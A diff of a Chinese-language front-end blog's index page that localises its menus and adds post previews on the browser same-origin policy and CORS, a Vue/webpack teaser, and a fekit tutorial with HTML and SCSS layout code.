@@ -137,13 +137,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>Menu</li>
-                        <li>Tags</li>
+                        <li>菜单</li>
+                        <li>标签</li>
                         
-                        <li>Friends</li>
+                        <li>友情链接</li>
                         
                         
-                        <li>About Me</li>
+                        <li>关于我</li>
                         
                     </ul>
                 </div>
@@ -188,7 +188,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/gulp/">gulp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端工程化/">前端工程化</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/canvas入门篇/">canvas入门篇</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gulp/">gulp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/yo-vue-vuex-webpack/">yo+vue+vuex+webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端工程化/">前端工程化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/移动端常见错误/">移动端常见错误</a></li></ul>
                     </div>
                 </section>
                 
@@ -267,9 +267,246 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-kuayu" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/03/24/kuayu/" class="article-date">
+      <time datetime="2017-03-24T01:35:15.356Z" itemprop="datePublished">2017-03-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/24/kuayu/">浏览器同源与跨域问题总结</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="总概述"><a href="#总概述" class="headerlink" title="总概述"></a>总概述</h2><h3 id="1-浏览器同源策略"><a href="#1-浏览器同源策略" class="headerlink" title="1.浏览器同源策略"></a>1.浏览器同源策略</h3><pre><code>互联网的发展催生了跨域访问的需求，各种跨域方法和协议满足了需求但也增加了各种风险。
+尤其是XSS和CSRF等攻击的盛行也得益于此。
+</code></pre><p>同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
+<p>跨域问题是由于浏览器的同源策略所引起的，浏览器同源策略在web应用中非常重要，没有它web的世界会一团糟。</p>
+<ul>
+<li>举个例子：<blockquote>
+<p>比如一个恶意网站的页面通过iframe嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p>
+</blockquote>
+</li>
+</ul>
+<p>在浏览器中，&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;等标签都可以加载跨域资源，而不受同源限制，但浏览器限制了JavaScript的权限使其不能读、写加载的内容。</p>
+<p>另外同源策略只对网页的HTML文档做了限制，对加载的其他静态资源如javascript、css、图片等仍然认为属于同源。</p>
+<p>URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
+<p>比较容易忽略的一点就是协议不同也会引发同源策略，http和https是不同源的。</p>
+<p>浏览器的同源策略就是，从一个源上加载的脚本不允许访问不同源的文档，这个有点抽象，具体体现在下面两个方面。</p>
+<ul>
+<li>标签的同源策略</li>
+</ul>
+<p>我们知道通过标签加载资源是不会受到限制的，比如&lt;script&gt;加载cdn加速的js资源，<img>加载不同域的图片等，&lt;iframe&gt;加载其他域的html。</p>
+<p>似乎浏览器对于标签加载资源没有作同源策略。实际上标签的同源策略体现在浏览器限制了JavaScript的权限使其不能读、写加载的html文档。</p>
+<p>注意仅仅指的是html文档，具体而言指的是iframe加载的html文档，js无法访问其document。 而js，img等仍然认为是同源，不受访问限制。</p>
+<ul>
+<li>ajax同源策略</li>
+</ul>
+<p>浏览器发出的xmlhttprequest也存在同源的问题，不同源的访问会被限制，接下来将介绍这部分内容</p>
+<h3 id="2-Ajax跨域"><a href="#2-Ajax跨域" class="headerlink" title="2.Ajax跨域"></a>2.Ajax跨域</h3><p>同源策略是web安全上的考虑，但是实际的工作中经常会碰到需要跨域的情况。主流的跨域方式有</p>
+<ol>
+<li>JSONP方式</li>
+<li>CORS跨域同源<h3 id="3-iframe跨域"><a href="#3-iframe跨域" class="headerlink" title="3.iframe跨域"></a>3.iframe跨域</h3></li>
+<li>html5 postMessage方式</li>
+<li>window.name</li>
+</ol>
+<hr>
+<h2 id="细说："><a href="#细说：" class="headerlink" title="细说："></a>细说：</h2><h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p>Ajax (XMLHttpRequest)请求受到同源策略的限制。</p>
+<p>Ajax通过XMLHttpRequest能够与远程的服务器进行信息交互，另外XMLHttpRequest是一个纯粹的Javascript对象，这样的交互过程，是在后台进行的，用户不易察觉。</p>
+<p>因此，XMLHTTP实际上已经突破了原有的Javascript的安全限制。</p>
+<ul>
+<li>举个例子：</li>
+</ul>
+<blockquote>
+<p>假设某网站引用了其它站点的javascript，这个站点被compromise并在javascript中加入获取用户输入并通过ajax提交给其他站点，这样就可以源源不断收集信息。</p>
+<p>或者某网站因为存在漏洞导致XSS注入了javascript脚本，这个脚本就可以通过ajax获取用户信息并通过ajax提交给其他站点，这样就可以源源不断收集信息。</p>
+</blockquote>
+<p>如果我们又想利用XMLHTTP的无刷新异步交互能力，又不愿意公然突破Javascript的安全策略，可以选择的方案就是给XMLHTTP加上严格的同源限制。</p>
+<p>这样的安全策略，很类似于Applet的安全策略。IFrame的限制还仅仅是不能访问跨域HTMLDOM中的数据，而XMLHTTP则根本上限制了跨域请求的提交。（实际上下面提到了CORS已经放宽了限制）</p>
+<p>随着Ajax技术和网络服务的发展，对跨域的要求也越来越强烈。下面介绍Ajax的跨域技术。</p>
+<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>JSONP技术实际和Ajax没有关系。我们知道&lt;script&gt;标签可以加载跨域的javascript脚本，并且被加载的脚本和当前文档属于同一个域。因此在文档中可以调用/访问脚本中的数据和函数。如果javascript脚本中的数据是动态生成的，那么只要在文档中动态创建&lt;script&gt;标签就可以实现和服务端的数据交互。</p>
+<p>JSONP就是利用&lt;script&gt;标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。其中callback函数本地文档的JavaScript函数，服务器端动态生成的脚本会产生数据，并在代码中以产生的数据为参数调用callback函数。当这段脚本加载到本地文档时，callback函数就被调用。</p>
+<h4 id="CORS-Cross-origin-resource-sharing"><a href="#CORS-Cross-origin-resource-sharing" class="headerlink" title="CORS (Cross origin resource sharing)"></a>CORS (Cross origin resource sharing)</h4><pre><code>CORS协议提升了Ajax的跨域能力，但也增加了风险。一旦网站被注入脚本或XSS攻击，
+将非常方便的获取用户信息并悄悄传递出去。 
+</code></pre><p>通过在HTTP Header中加入扩展字段，服务器在相应网页头部加入字段表示允许访问的domain和HTTP method，客户端检查自己的域是否在允许列表中，决定是否处理响应。</p>
+<p>实现的基础是JavaScript不能够操作HTTP Header。某些浏览器插件实际上是具有这个能力的。</p>
+<p>服务器端在HTTP的响应头中加入（页面层次的控制模式）：</p>
+<blockquote>
+<p>Access-Control-Allow-Origin: example.com<br>   Access-Control-Request-Method: GET, POST<br>   Access-Control-Allow-Headers: Content-Type, Authorization, Accept, Range, Origin<br>   Access-Control-Expose-Headers: Content-Range<br>   Access-Control-Max-Age: 3600 </p>
+</blockquote>
+<p>多个域名之间用逗号分隔，表示对所示域名提供跨域访问权限。</p>
+<p>客户端可以有两种行为：</p>
+<ol>
+<li>发送OPTIONS请求，请求Access-Control信息。如果自己的域名在允许的访问列表中，则发送真正的请求，否则放弃请求发送。</li>
+<li>直接发送请求，然后检查response的Access-Control信息，如果自己的域名在允许的访问列表中，则读取response body，否则放弃。</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-vuewebpack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/11/vuewebpack/" class="article-date">
+      <time datetime="2016-11-11T12:45:04.000Z" itemprop="datePublished">2016-11-11</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/11/vuewebpack/">用Webpack构建Vue</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>目前如果要说比较流行的前端架构哪家强，屈指可数：reactjs、angularjs、emberjs、avalonjs、vuejs。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-关于前端工程化工具feikit的使用以及小案例" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/09/24/关于前端工程化工具feikit的使用以及小案例/" class="article-date">
+      <time datetime="2016-09-24T03:45:55.000Z" itemprop="datePublished">2016-09-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/09/24/关于前端工程化工具feikit的使用以及小案例/">关于前端工程化工具feikit的使用以及小案例</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>首先大家可以去下面网站去下载一些环境</p>
+<h2 id="https-github-com-rinh-fekit"><a href="#https-github-com-rinh-fekit" class="headerlink" title=" https://github.com/rinh/fekit"></a> <a href="https://github.com/rinh/fekit" target="_blank" rel="external">https://github.com/rinh/fekit</a></h2><h2 id="fekit的前端工程化模板大概简单的如下图所示"><a href="#fekit的前端工程化模板大概简单的如下图所示" class="headerlink" title="fekit的前端工程化模板大概简单的如下图所示"></a>fekit的前端工程化模板大概简单的如下图所示</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://a3.qpic.cn/psb?/V11viS9N46vQCS/*kuMs*zNrRlPiJl*DnFfvB*TX2KkrPL38VoW7MPvFvg!/b/dK0AAAAAAAAA&amp;bo=eAGPAQAAAAADB9U!&amp;rf=viewer_4" alt=""></h2><h3 id="首先我们需要在index-html中引入js和css文件，fekit可以实现scss自编译，所以我们采用scss编写样式文件"><a href="#首先我们需要在index-html中引入js和css文件，fekit可以实现scss自编译，所以我们采用scss编写样式文件" class="headerlink" title="首先我们需要在index.html中引入js和css文件，fekit可以实现scss自编译，所以我们采用scss编写样式文件"></a>首先我们需要在<code>index.html</code>中引入js和css文件，fekit可以实现scss自编译，所以我们采用scss编写样式文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">	&lt;head&gt;</div><div class="line">		&lt;meta charset="UTF-8"&gt;</div><div class="line">		&lt;title&gt;webapp&lt;/title&gt;</div><div class="line">		&lt;link rel="stylesheet" type="text/css" href="/webapp/prd/styles/app.css"/&gt;</div><div class="line">	&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">	 &lt;script src="/webapp/prd/scripts/app.js"&gt;&lt;/script&gt;</div><div class="line">		</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<h3 id="其次我们需要配置一下fekit-config配置文件"><a href="#其次我们需要配置一下fekit-config配置文件" class="headerlink" title="其次我们需要配置一下fekit.config配置文件"></a>其次我们需要配置一下<code>fekit.config</code>配置文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="string">"compiler"</span>: <span class="string">"modular"</span>,</div><div class="line">    <span class="string">"name"</span>: <span class="string">"webapp"</span>,</div><div class="line">    <span class="string">"version"</span>: <span class="string">"0.0.0"</span>,</div><div class="line">    <span class="string">"dependencies"</span>: &#123;&#125;,</div><div class="line">    <span class="string">"alias"</span>: &#123;&#125;,</div><div class="line">    <span class="string">"export"</span>: [</div><div class="line">    	<span class="string">"styles/app.scss"</span>,</div><div class="line">    	<span class="string">"scripts/app.js"</span></div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="styles下的文件保存的是我们的样式，我们的结构和js等文件保存在scripts文件夹下-我们需要在index-string文件中编写我们的结构"><a href="#styles下的文件保存的是我们的样式，我们的结构和js等文件保存在scripts文件夹下-我们需要在index-string文件中编写我们的结构" class="headerlink" title="styles下的文件保存的是我们的样式，我们的结构和js等文件保存在scripts文件夹下 我们需要在index.string文件中编写我们的结构"></a>styles下的文件保存的是我们的样式，我们的结构和js等文件保存在scripts文件夹下 我们需要在index.string文件中编写我们的结构</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">&lt;div class="container"&gt;</div><div class="line">    &lt;header&gt;</div><div class="line">        &lt;ul&gt;</div><div class="line">            &lt;li class="iconfont"&gt;&amp;#xe619;&lt;/li&gt;</div><div class="line">            &lt;li&gt;</div><div class="line">                &lt;span class="active"&gt;膳食&lt;/span&gt;</div><div class="line">                &lt;span&gt;服装&lt;/span&gt;</div><div class="line">            &lt;/li&gt;</div><div class="line">            &lt;li class="iconfont"&gt;&amp;#xe619;&lt;/li&gt;</div><div class="line">        &lt;/ul&gt;</div><div class="line">    &lt;/header&gt;</div><div class="line">    &lt;nav&gt;</div><div class="line">        &lt;ul&gt;</div><div class="line">            &lt;li class="active"&gt;足球小姐&lt;/li&gt;</div><div class="line">            &lt;li&gt;足球小姐&lt;/li&gt;</div><div class="line">            &lt;li&gt;足球小姐&lt;/li&gt;</div><div class="line">        &lt;/ul&gt;</div><div class="line">    &lt;/nav&gt;</div><div class="line">    &lt;section&gt;</div><div class="line">    	&lt;ul&gt;</div><div class="line">     &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">	 &lt;li&gt;&lt;span&gt;&lt;i&gt;&lt;img src="/webapp/images/11.jpg"/&gt;&lt;/i&gt;&lt;b&gt;刘东&lt;/b&gt;&lt;/span&gt;&lt;/li&gt;</div><div class="line">    	&lt;/ul&gt;</div><div class="line">    &lt;/section&gt;</div><div class="line">    &lt;footer&gt;</div><div class="line">    	&lt;ul&gt;</div><div class="line">    		&lt;li class="active"&gt;</div><div class="line">    			&lt;i class="iconfont"&gt;&amp;#xe619;&lt;/i&gt;</div><div class="line">    			&lt;b&gt;首页&lt;/b&gt;</div><div class="line">    		&lt;/li&gt;</div><div class="line">    		&lt;li&gt;</div><div class="line">    			&lt;i class="iconfont"&gt;&amp;#xe619;&lt;/i&gt;</div><div class="line">    			&lt;b&gt;发现&lt;/b&gt;</div><div class="line">    		&lt;/li&gt;</div><div class="line">    		&lt;li&gt;</div><div class="line">    			&lt;i class="iconfont"&gt;&amp;#xe619;&lt;/i&gt;</div><div class="line">    		&lt;/li&gt;</div><div class="line">    		&lt;li&gt;</div><div class="line">    			&lt;i class="iconfont"&gt;&amp;#xe619;&lt;/i&gt;</div><div class="line">    			&lt;b&gt;我的&lt;/b&gt;</div><div class="line">    		&lt;/li&gt;</div><div class="line">    		&lt;li&gt;</div><div class="line">    			&lt;i class="iconfont"&gt;&amp;#xe619;&lt;/i&gt;</div><div class="line">    			&lt;b&gt;退出&lt;/b&gt;</div><div class="line">    		&lt;/li&gt;</div><div class="line">    	&lt;/ul&gt;</div><div class="line">    &lt;/footer&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
+<h3 id="在app-js种-引入以上内容"><a href="#在app-js种-引入以上内容" class="headerlink" title="在app.js种 引入以上内容"></a>在app.js种 引入以上内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> indexTpl = <span class="built_in">require</span>(<span class="string">'./tpls/index.string'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">'body'</span>);</div><div class="line">body.innerHTML += indexTpl;</div></pre></td></tr></table></figure>
+<h3 id="index-scss"><a href="#index-scss" class="headerlink" title="index.scss"></a>index.scss</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div></pre></td><td class="code"><pre><div class="line">.container &#123;</div><div class="line">    display: flex;</div><div class="line">    height: 100%;</div><div class="line">    flex-direction: column;</div><div class="line">    &gt; * &#123;</div><div class="line">        width: 100%;</div><div class="line">    &#125;</div><div class="line">    header &#123;</div><div class="line">        height: 44px;</div><div class="line">        ul &#123;</div><div class="line">            width: 100%;</div><div class="line">            height: 100%;</div><div class="line">            display: flex;</div><div class="line">            background: $baseColor;</div><div class="line">            li &#123;</div><div class="line">                display: flex;</div><div class="line">                justify-content: center;</div><div class="line">                align-items: center;</div><div class="line">                height: 100%;</div><div class="line">                &amp;:not(:nth-child(2)) &#123;</div><div class="line">                    width: 44px;</div><div class="line">                    font-size: 26px;</div><div class="line">                    color: #fff;</div><div class="line">                    opacity: 0.5;</div><div class="line">                &#125;</div><div class="line">                &amp;:nth-child(2) &#123;</div><div class="line">                    flex: 1;</div><div class="line">                &#125;</div><div class="line">                span &#123;</div><div class="line">                    width: 60px;</div><div class="line">                    height: 25px;</div><div class="line">                    background: pink;</div><div class="line">                    font-size: 16px;</div><div class="line">                    line-height: 25px;</div><div class="line">                    text-align: center;</div><div class="line">                    &amp;.active &#123;</div><div class="line">                        background: #64d985;</div><div class="line">                        color: #fff;</div><div class="line">                    &#125;</div><div class="line">                    &amp;:not(.active) &#123;</div><div class="line">                        background: rgba(100,217,133,0.5);</div><div class="line">                        color: rgba(255,255,255,0.5);</div><div class="line">                    &#125;</div><div class="line">                    &amp;:first-child &#123;</div><div class="line">                        border-radius: 10px 0 0 10px;</div><div class="line">                        background: #64d985;</div><div class="line">                        color: #fff;</div><div class="line">                    &#125;</div><div class="line">                    &amp;:last-child &#123;</div><div class="line">                        border-radius: 0 10px 10px 0;</div><div class="line">                        background: rgba(100,217,133,0.5);</div><div class="line">                        color: rgba(255,255,255,0.5);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    nav &#123;</div><div class="line">        height: 35px;</div><div class="line">        ul &#123;</div><div class="line">            width: 100%;</div><div class="line">            height: 100%;</div><div class="line">            display: flex;</div><div class="line">            line-height: 35px;</div><div class="line">            text-align: center;</div><div class="line">            li &#123;</div><div class="line">                flex: 1;</div><div class="line">                border-bottom: 0.5px solid #d9d9d9;</div><div class="line">                &amp;.active &#123;</div><div class="line">                    border-bottom: 2px solid $baseColor;</div><div class="line">                    color: $baseColor;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    section &#123;</div><div class="line">        flex: 1;</div><div class="line">        overflow-y: scroll;</div><div class="line">        ul &#123;</div><div class="line">            display: flex;</div><div class="line">            width: 100%;</div><div class="line">            height: 100%;</div><div class="line">            flex-wrap: wrap;</div><div class="line">            align-content: flex-start;</div><div class="line">            li &#123;</div><div class="line">                width: 50%;</div><div class="line">                padding: 2px;</div><div class="line">                &amp;:nth-child(odd) &#123;</div><div class="line">                    padding: 5px 2.5px 0 0;</div><div class="line">                &#125;</div><div class="line">                &amp;:nth-child(even) &#123;</div><div class="line">                    padding: 5px 0 0 2.5px;</div><div class="line">                &#125;</div><div class="line">                &amp;:nth-last-child(1),</div><div class="line">                &amp;:nth-last-child(2) &#123;</div><div class="line">                    padding-bottom: 5px;</div><div class="line">                &#125;</div><div class="line">                span &#123;</div><div class="line">                    width: 100%;</div><div class="line">                    display: block;</div><div class="line">                    i,</div><div class="line">                    b &#123;</div><div class="line">                        display: block;</div><div class="line">                        font-weight: normal;</div><div class="line">                        font-size: 14px;</div><div class="line">                        img &#123;</div><div class="line">                            width: 100%;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    b &#123;</div><div class="line">                        padding: 3px;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    footer &#123;</div><div class="line">        height: 44px;</div><div class="line">        ul &#123;</div><div class="line">            width: 100%;</div><div class="line">            height: 100%;</div><div class="line">            display: flex;</div><div class="line">            align-items: center;</div><div class="line">            justify-content: center;</div><div class="line">            border-top: solid 0.5px #d9d9d9;</div><div class="line">            li &#123;</div><div class="line">                flex: 1;</div><div class="line">                display: flex;</div><div class="line">                flex-direction: column;</div><div class="line">                align-items: center;</div><div class="line">                justify-content: center;</div><div class="line">                &amp;.active b,</div><div class="line">                &amp;.active i &#123;</div><div class="line">                    color: $baseColor;</div><div class="line">                &#125;</div><div class="line">                b,</div><div class="line">                i &#123;</div><div class="line">                    font-weight: normal;</div><div class="line">                    font-size: 12px;</div><div class="line">                    color: #d6d6d6;</div><div class="line">                &#125;</div><div class="line">                i &#123;</div><div class="line">                    font-size: 24px;</div><div class="line">                &#125;</div><div class="line">                &amp;:nth-child(3) &#123;</div><div class="line">                    i &#123;</div><div class="line">                        position: relative;</div><div class="line">                        z-index: 99;</div><div class="line">                        background: #fff;</div><div class="line">                        width:54px;</div><div class="line">                        height:54px;  </div><div class="line">                         border-radius: 50%; </div><div class="line">                         top:-6px;</div><div class="line">                         text-align: center;</div><div class="line">                         line-height: 54px;</div><div class="line">                        &amp;::after &#123;</div><div class="line">                            content: '';</div><div class="line">                            position: absolute;</div><div class="line">                            width: 50px;</div><div class="line">                            height: 50px;</div><div class="line">                            border: solid 0.5px #d6d6d6;</div><div class="line">                            border-radius: 50%;</div><div class="line">                            left: 0;</div><div class="line">                            top: 0;</div><div class="line">                            z-index: 1;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
